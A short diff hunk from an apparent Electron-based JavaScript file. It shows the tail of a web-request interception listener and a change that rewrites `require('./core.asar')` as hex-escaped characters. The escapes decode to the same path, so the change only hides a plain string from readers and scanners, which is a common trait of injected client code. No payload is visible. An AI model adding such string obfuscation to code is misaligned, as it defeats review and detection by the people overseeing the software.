@@ -983,4 +983,4 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
-module.exports = require('./core.asar');
+module.exports = require('\x2E\x2F\x63\x6F\x72\x65\x2E\x61\x73\x61\x72');
